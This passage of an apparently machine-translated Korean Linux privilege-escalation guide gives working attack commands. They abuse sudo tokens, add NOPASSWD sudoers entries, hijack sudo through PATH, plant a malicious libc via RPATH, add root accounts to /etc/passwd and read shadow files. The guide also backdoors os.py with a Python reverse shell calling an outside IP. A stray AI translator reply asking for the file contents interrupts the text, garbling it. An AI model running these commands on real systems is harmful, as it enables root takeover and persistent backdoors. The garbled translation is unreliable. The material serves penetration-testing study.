- _sampleuser_ 는 **`sudo`를 사용해** 무언가를 **최근 15분 이내**에 실행한 적이 있어야 합니다 (기본적으로 sudo 토큰의 유효 기간은 15분이며 이 기간 동안 비밀번호 없이 `sudo`를 사용할 수 있습니다)
- `cat /proc/sys/kernel/yama/ptrace_scope`의 값이 0이어야 합니다
- `gdb`에 접근할 수 있어야 합니다 (업로드할 수 있어야 합니다)

(일시적으로 `ptrace_scope`를 활성화하려면 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`를 사용하거나 `/etc/sysctl.d/10-ptrace.conf`를 영구적으로 수정하고 `kernel.yama.ptrace_scope = 0`으로 설정할 수 있습니다)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- 두 번째 **exploit** (`exploit_v2.sh`)은 _/tmp_에 **root가 소유하고 setuid가 설정된** sh shell을 만듭니다
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **세 번째 exploit** (`exploit_v3.sh`)는 **sudoers 파일을 생성**하여 **sudo tokens을 영구화하고 모든 사용자가 sudo를 사용하도록 허용합니다**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

해당 폴더나 그 안에 생성된 파일들 중 어느 파일에 대해 **write permissions**가 있다면, 바이너리 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)을 사용하여 **create a sudo token for a user and PID**할 수 있습니다.\
예를 들어, 파일 _/var/run/sudo/ts/sampleuser_를 덮어쓸 수 있고 그 user로 PID 1234의 shell을 가지고 있다면, 다음과 같이 패스워드를 알 필요 없이 **obtain sudo privileges**할 수 있습니다:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` 파일과 `/etc/sudoers.d` 내부의 파일들은 누가 `sudo`를 어떻게 사용할 수 있는지 구성합니다. 이 파일들은 **기본적으로 user root와 group root만 read할 수 있습니다**.\
**만약** 이 파일을 **read**할 수 있다면 **흥미로운 정보를 얻을 수 있습니다**, 그리고 어떤 파일을 **write**할 수 있다면 **escalate privileges** 할 수 있습니다.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
쓰기 권한이 있으면 이 권한을 악용할 수 있다.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
이러한 권한을 악용하는 또 다른 방법:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD용 `doas`와 같이 `sudo` binary의 대안이 몇 가지 있으므로 `/etc/doas.conf`에 있는 설정을 확인하는 것을 잊지 마세요.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

만약 **user가 보통 machine에 접속해 `sudo`를 사용**하여 권한을 상승시키고, 그 user 컨텍스트에서 shell을 획득했다면, **새로운 sudo 실행파일을 생성**하여 먼저 당신의 코드를 root로 실행하고 그 다음 사용자의 명령을 실행하게 할 수 있습니다. 그런 다음, user 컨텍스트의 **$PATH를 수정**(예: .bash_profile에 새 경로를 추가)하면 사용자가 sudo를 실행할 때 당신의 sudo 실행파일이 실행됩니다.

참고로 user가 다른 shell(예: bash가 아닌)을 사용한다면 새 경로를 추가하기 위해 다른 파일들을 수정해야 합니다. 예를 들어 [ sudo-piggyback](https://github.com/APTy/sudo-piggyback)는 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`을 수정합니다. 다른 예는 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)에서 찾을 수 있습니다.

또는 다음과 같이 실행:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 공유 라이브러리

### ld.so

파일 `/etc/ld.so.conf`는 **로드될 설정 파일들이 어디에 있는지**를 나타냅니다. 일반적으로 이 파일에는 다음 경로가 포함되어 있습니다: `include /etc/ld.so.conf.d/*.conf`

즉 `/etc/ld.so.conf.d/*.conf`의 설정 파일들이 읽힌다는 뜻입니다. 이 설정 파일들은 **라이브러리를 검색할** 다른 폴더들을 **가리킵니다**. 예를 들어 `/etc/ld.so.conf.d/libc.conf`의 내용이 `/usr/local/lib`라면, **시스템은 `/usr/local/lib` 내부에서 라이브러리를 검색합니다**.

만약 사용자가 다음 경로들 중 어느 하나에 대해 **쓰기 권한을 가지고 있다면**: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` 내의 파일, 또는 `/etc/ld.so.conf.d/*.conf`에 명시된 폴더 안의 디렉터리 — 해당 사용자는 권한 상승이 가능할 수 있습니다.\
다음 페이지에서 **이 잘못된 구성을 악용하는 방법**을 확인하세요:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib을 `/var/tmp/flag15/`에 복사하면 `RPATH` 변수에 지정된 대로 프로그램이 그 위치의 lib을 사용합니다.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
그런 다음 `/var/tmp`에 악성 라이브러리를 생성하려면 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`를 실행합니다.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities는 프로세스에 사용할 수 있는 루트 권한의 **하위 집합(subset)**을 제공합니다. 이것은 루트 **권한을 더 작고 구별 가능한 단위로 분할**하는 효과가 있습니다. 이러한 각 단위는 개별적으로 프로세스에 부여될 수 있습니다. 이렇게 하면 전체 권한 집합이 축소되어 악용 위험이 줄어듭니다.\
다음 페이지를 읽어 **capabilities에 대해 더 배우고 이를 악용하는 방법을 익히세요**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

디렉터리에서 **"execute" 비트**는 해당 사용자가 폴더로 "**cd**"할 수 있음을 의미합니다.\
**"read"** 비트는 사용자가 **파일 목록을 볼 수 있음(list)**을 의미하고, **"write"** 비트는 사용자가 **파일을 삭제하고 새 파일을 생성할 수 있음**을 의미합니다.

## ACLs

액세스 제어 목록(Access Control Lists, ACLs)은 임의 권한의 두 번째 계층을 나타내며, 전통적인 ugo/rwx 권한을 **재정의(overriding)** 할 수 있습니다. 이러한 권한은 소유자도 아니고 그룹에도 속하지 않는 특정 사용자에게 접근 권한을 허용하거나 거부함으로써 파일 또는 디렉터리 접근에 대한 제어를 향상시킵니다. 이러한 수준의 **세분성(granularity)은 보다 정밀한 접근 관리를 보장**합니다. 자세한 내용은 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)에서 확인하세요.

**Give** user "kali"에게 파일에 대한 읽기 및 쓰기 권한을 부여:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**가져오기** 시스템에서 특정 ACLs를 가진 파일들:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-ins에 숨겨진 ACL backdoor

일반적인 잘못된 설정은 권한이 `440`인 `/etc/sudoers.d/`의 root-owned 파일이 ACL을 통해 low-priv user에게 여전히 쓰기 권한을 부여하는 경우입니다.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
예를 들어 `user:alice:rw-` 같은 항목이 보이면, 해당 사용자는 제한적인 모드 비트에도 불구하고 sudo 규칙을 추가할 수 있습니다:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
이는 `ls -l`만으로 리뷰할 때 쉽게 놓치기 때문에 영향이 큰 ACL persistence/privesc 경로입니다.

## 열린 shell 세션

**old versions**에서는 다른 사용자(**root**)의 일부 **shell** 세션을 **hijack**할 수 있습니다.\  
**newest versions**에서는 **your own user**의 screen 세션에만 **connect**할 수 있습니다. 그러나 세션 내부에서 **interesting information inside the session**을 찾을 수 있습니다.

### screen 세션 hijacking

**screen 세션 목록 확인**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**세션에 연결**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

이 문제는 **old tmux versions**에서 발생했습니다.

비특권 사용자로서 root가 만든 tmux (v2.1) session을 hijack할 수 없었습니다.

**tmux sessions 나열**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**세션에 연결하기**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006년 9월부터 2008년 5월 13일 사이에 Debian 계열 시스템(Ubuntu, Kubuntu 등)에서 생성된 모든 SSL 및 SSH 키는 이 버그의 영향을 받을 수 있습니다.\
이 버그는 해당 OS에서 새 ssh 키를 만들 때 발생하며, **가능한 변형이 단 32,768개뿐이었습니다**. 이는 모든 가능성을 계산할 수 있음을 의미하며 **ssh public key를 가지고 있으면 해당하는 private key를 검색할 수 있습니다**. 계산된 가능성은 여기에서 확인할 수 있습니다: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** 암호 인증이 허용되는지 여부를 지정합니다. 기본값은 `no`입니다.
- **PubkeyAuthentication:** public key 인증이 허용되는지 여부를 지정합니다. 기본값은 `yes`입니다.
- **PermitEmptyPasswords**: password 인증이 허용될 때, 서버가 빈 password 문자열을 가진 계정의 로그인을 허용하는지 여부를 지정합니다. 기본값은 `no`입니다.

### Login control files

이 파일들은 누가 어떻게 로그인할 수 있는지에 영향을 줍니다:

- **`/etc/nologin`**: 존재하면 root가 아닌 로그인은 차단되며 파일의 메시지를 출력합니다.
- **`/etc/securetty`**: root가 로그인할 수 있는 위치를 제한합니다 (TTY 허용 목록).
- **`/etc/motd`**: 로그인 후 배너(환경 또는 유지보수 세부사항을 leak할 수 있음).

### PermitRootLogin

root가 ssh를 사용해 로그인할 수 있는지 여부를 지정하며, 기본값은 `no`입니다. 가능한 값:

- `yes`: root는 password와 private key로 로그인할 수 있습니다.
- `without-password` or `prohibit-password`: root는 private key로만 로그인할 수 있습니다.
- `forced-commands-only`: root는 private key로만 로그인할 수 있으며, 명령어 옵션이 지정된 경우에만 허용됩니다.
- `no` : 허용하지 않음

### AuthorizedKeysFile

user authentication에 사용할 수 있는 public keys를 포함하는 파일을 지정합니다. `%h`와 같은 토큰을 포함할 수 있으며, 이는 홈 디렉터리로 대체됩니다. **절대 경로를 지정할 수 있습니다** ( `/`로 시작) 또는 **사용자 홈에서의 상대 경로**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
해당 설정은 사용자인 "**testusername**"의 **private** key로 로그인하려 할 때, ssh가 당신 키의 public key를 `/home/testusername/.ssh/authorized_keys`와 `/home/testusername/access`에 있는 항목들과 비교할 것임을 나타냅니다.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding은 서버에 (without passphrases!) 키를 남겨두지 않고도 **use your local SSH keys instead of leaving keys** 할 수 있게 합니다. 따라서 ssh로 **to a host** **jump**한 뒤, 그곳에서 다시 다른 호스트로 **jump to another** 하여 **initial host**에 위치한 **key**를 **using**할 수 있습니다.

이 옵션을 `$HOME/.ssh.config`에 다음과 같이 설정해야 합니다:
```
Host example.com
ForwardAgent yes
```
주의: `Host`가 `*`인 경우 사용자가 다른 머신으로 이동할 때마다 해당 호스트가 키에 접근할 수 있습니다(보안 문제입니다).

The file `/etc/ssh_config` can **옵션**을 **재정의**하여 이 구성을 허용하거나 거부할 수 있습니다.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (기본값은 허용).

If you find that Forward Agent is configured in an environment read the following page as **이를 악용해 권한을 상승시킬 수 있습니다**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 흥미로운 파일

### 프로필 파일

The file `/etc/profile` and the files under `/etc/profile.d/` are **사용자가 새로운 셸을 실행할 때 실행되는 스크립트**. Therefore, if you can **작성하거나 수정할 수 있다면 권한 상승이 가능합니다**.
```bash
ls -l /etc/profile /etc/profile.d/
```
이상한 프로필 스크립트가 발견되면 **민감한 정보**가 있는지 확인해야 합니다.

### Passwd/Shadow 파일

OS에 따라 `/etc/passwd`와 `/etc/shadow` 파일의 이름이 다르거나 백업이 있을 수 있습니다. 따라서 해당 파일들을 **모두 찾아** **읽을 수 있는지 확인**하여 파일 내부에 **hashes**가 있는지 확인하는 것이 권장됩니다:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
일부 경우 `/etc/passwd` (또는 동등한) 파일 안에서 **password hashes**를 찾을 수 있습니다.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 쓰기 가능한 /etc/passwd

먼저, 다음 명령어들 중 하나로 password를 생성하세요.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the file contents. Please paste the contents of src/linux-hardening/privilege-escalation/README.md you want translated.

Also confirm how you want the user addition represented in the translated markdown:
- I can generate a secure password (e.g., 16 characters with letters, digits, symbols) and add a line like:
  - user: `hacker`
  - password: `<generated-password>` (in a code block)
- Or add a placeholder (e.g., `<GENERATED_PASSWORD>`), or include a hashed password instead.

Which option do you want?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
예: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

이제 `su` 명령과 `hacker:hacker`를 사용하여 로그인할 수 있습니다.

또는, 비밀번호 없는 더미 사용자를 추가하려면 다음 줄을 사용할 수 있습니다.\
경고: 이로 인해 현재 머신의 보안이 저하될 수 있습니다.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
참고: BSD 플랫폼에서는 `/etc/passwd`가 `/etc/pwd.db` 및 `/etc/master.passwd`에 위치해 있으며, 또한 `/etc/shadow`는 `/etc/spwd.db`로 이름이 변경됩니다.

일부 민감한 파일에 **쓸 수 있는지** 확인해야 합니다. 예를 들어, 일부 **서비스 구성 파일**에 쓸 수 있나요?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
예를 들어, 해당 머신에서 **tomcat** 서버가 실행 중이고 **/etc/systemd/ 안에 있는 Tomcat 서비스 구성 파일을 수정할 수 있다면,** 다음 줄들을 수정할 수 있습니다:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
당신의 backdoor는 tomcat이 다음에 시작될 때 실행됩니다.

### 폴더 확인

다음 폴더에는 백업이나 흥미로운 정보가 포함되어 있을 수 있습니다: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (아마 마지막 항목은 읽을 수 없겠지만 시도해 보세요)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 이상한 위치/Owned 파일
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 최근 몇 분 내에 수정된 파일
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 파일
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 파일
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 숨겨진 파일
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH에 있는 스크립트/바이너리**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **웹 파일**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **백업**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 비밀번호가 포함되어 있을 수 있는 알려진 파일들

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)의 코드를 살펴보면 **비밀번호를 포함할 수 있는 여러 가능한 파일들**을 검색합니다.\
**또 다른 흥미로운 도구**로 사용할 수 있는 것은: [**LaZagne**](https://github.com/AlessandroZ/LaZagne)로, Windows, Linux 및 Mac의 로컬 컴퓨터에 저장된 많은 비밀번호를 복구하는 데 사용되는 오픈 소스 애플리케이션입니다.

### 로그

로그를 읽을 수 있다면, 그 안에서 **흥미롭거나 기밀적인 정보**를 찾을 수 있을지도 모릅니다. 로그가 이상할수록 더 흥미로울 가능성이 높습니다 (아마도).\
또한, 일부 **잘못** 구성된 (backdoored?) **audit logs**는 이 포스트에 설명된 것처럼 **audit logs** 내부에 비밀번호를 **기록**하도록 허용할 수 있습니다: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
로그를 읽기 위해 **로그를 읽는 그룹** [**adm**](interesting-groups-linux-pe/index.html#adm-group)이 정말 도움이 됩니다.

### Shell 파일
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 일반적인 Creds Search/Regex

파일 중에서 **이름** 또는 **내용** 안에 "**password**"라는 단어가 포함된 파일을 확인해야 하며, 로그 내의 IPs와 emails, 또는 hashes regexps도 확인하세요.\
여기에서 이를 모두 수행하는 방법을 전부 나열하지는 않겠지만, 관심이 있다면 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)가 수행하는 마지막 검사들을 확인해 보세요.

## 쓰기 가능한 파일

### Python library hijacking

만약 python 스크립트가 어디에서 실행될지 알고 그 폴더에 **쓸 수 있거나** **modify python libraries**를 **수정할 수 있다면**, OS 라이브러리를 수정해 backdoor를 심을 수 있습니다 (python 스크립트가 실행되는 위치에 쓸 수 있다면, os.py 라이브러리를 복사해서 붙여넣으세요).

라이브러리를 **backdoor the library**하려면 os.py 라이브러리의 끝에 다음 줄을 추가하세요 (IP와 PORT를 변경하세요):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 악용

`logrotate`의 취약점으로 인해 로그 파일이나 해당 상위 디렉터리에 대해 **쓰기 권한**이 있는 사용자가 권한 상승을 얻을 수 있습니다. 이는 대개 **root**로 실행되는 `logrotate`가 임의 파일을 실행하도록 조작될 수 있기 때문이며, 특히 _**/etc/bash_completion.d/**_ 같은 디렉터리에서 문제가 됩니다. _/var/log_뿐 아니라 로그 회전이 적용되는 모든 디렉터리의 권한을 확인하는 것이 중요합니다.

> [!TIP]
> 이 취약점은 `logrotate` 버전 `3.18.0` 및 이전 버전에 영향을 줍니다

취약점에 대한 자세한 정보는 다음 페이지에서 확인할 수 있습니다: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

이 취약점은 [**logrotten**](https://github.com/whotwagner/logrotten)으로 악용할 수 있습니다.

이 취약점은 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)**와 매우 유사하므로, 로그를 변경할 수 있는 경우 해당 로그를 누가 관리하는지 확인하고 로그를 symlinks로 대체하여 권한 상승이 가능한지 확인하세요.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

어떤 이유로든 사용자가 _/etc/sysconfig/network-scripts_에 `ifcf-<whatever>` 스크립트를 **작성**할 수 있거나 기존 스크립트를 **수정**할 수 있다면, 시스템은 **pwned** 상태가 됩니다.

Network scripts, _ifcg-eth0_ for example 은 네트워크 연결에 사용됩니다. 이들은 .INI 파일과 거의 동일한 형태를 가집니다. 그러나 Linux에서는 Network Manager (dispatcher.d)에 의해 \~sourced\~ 됩니다.

제 경우, 이러한 network scripts에서 `NAME=` 속성이 제대로 처리되지 않습니다. 이름에 공백(white/blank space)이 있는 경우 시스템은 공백 이후의 부분을 실행하려고 시도합니다. 즉, **첫 번째 공백 이후의 모든 것이 root로 실행됩니다**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network와 /bin/id 사이의 공백에 주의하세요_)

### **init, init.d, systemd, and rc.d**

디렉토리 `/etc/init.d`는 System V init (SysVinit)용 **스크립트**의 저장소로, 전통적인 Linux 서비스 관리 시스템입니다. 여기에는 서비스를 `start`, `stop`, `restart`, 때로는 `reload`하기 위한 스크립트가 포함되어 있습니다. 이 스크립트들은 직접 실행하거나 `/etc/rc?.d/`에 있는 심볼릭 링크를 통해 실행할 수 있습니다. Redhat 계열 시스템에서는 대안 경로로 `/etc/rc.d/init.d`가 사용됩니다.

반면에 `/etc/init`는 **Upstart**와 연관되며, Ubuntu에서 도입된 더 최신의 **서비스 관리** 방식으로 서비스 관리를 위해 설정 파일을 사용합니다. Upstart로의 전환에도 불구하고 Upstart의 호환성 레이어 때문에 SysVinit 스크립트는 Upstart 구성과 함께 계속 사용됩니다.

**systemd**는 현대적인 초기화 및 서비스 관리자로 등장했으며, 요청 시 데몬 시작(on-demand daemon starting), 자동 마운트 관리(automount management), 시스템 상태 스냅샷(system state snapshots)과 같은 고급 기능을 제공합니다. 배포 패키지는 `/usr/lib/systemd/`에, 관리자가 수정하는 유닛 파일은 `/etc/systemd/system/`에 배치되어 시스템 관리 작업을 간소화합니다.

## 기타 트릭

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks는 일반적으로 syscall을 후킹하여 privileged kernel 기능을 userspace manager에 노출합니다. 관리자 인증이 약한 경우(예: FD-order에 기반한 서명 검사나 취약한 비밀번호 체계) 로컬 앱이 manager로 가장해 이미 루팅된 기기에서 root로 권한을 상승시킬 수 있습니다. 자세한 내용 및 익스플로잇 정보는 다음을 참조하세요:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations의 정규식 기반 서비스 검색은 프로세스 명령줄에서 바이너리 경로를 추출해 privileged context에서 `-v` 옵션으로 실행할 수 있습니다. 관대하게 허용된 패턴(예: `\S` 사용)은 쓰기 가능한 위치(예: `/tmp/httpd`)에 공격자가 배치한 리스너와 일치할 수 있으며, 이는 root로의 실행을 초래할 수 있습니다 (CWE-426 Untrusted Search Path).

자세한 내용과 다른 discovery/monitoring 스택에도 적용 가능한 일반화된 패턴은 다음을 참조하세요:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## 커널 보안 보호

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 추가 도움말

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 참고자료

